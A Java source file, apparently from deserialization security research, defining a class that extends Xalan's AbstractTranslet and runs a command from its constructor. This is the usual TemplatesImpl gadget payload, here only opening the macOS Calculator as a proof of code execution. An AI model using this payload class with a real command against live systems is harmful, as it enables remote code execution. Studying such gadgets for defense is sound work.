package com.jemmy.serialize.leak;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;

/**
 * @author zhujiang.cheng
 * @since 2020/6/3
 */
public class Test extends AbstractTranslet {

    public Test() throws IOException {
        Runtime.getRuntime().exec("open /Applications/Calculator.app");
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        System.out.println("transform");
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
        throws TransletException {
        System.out.println("transform with iterator");
    }
}
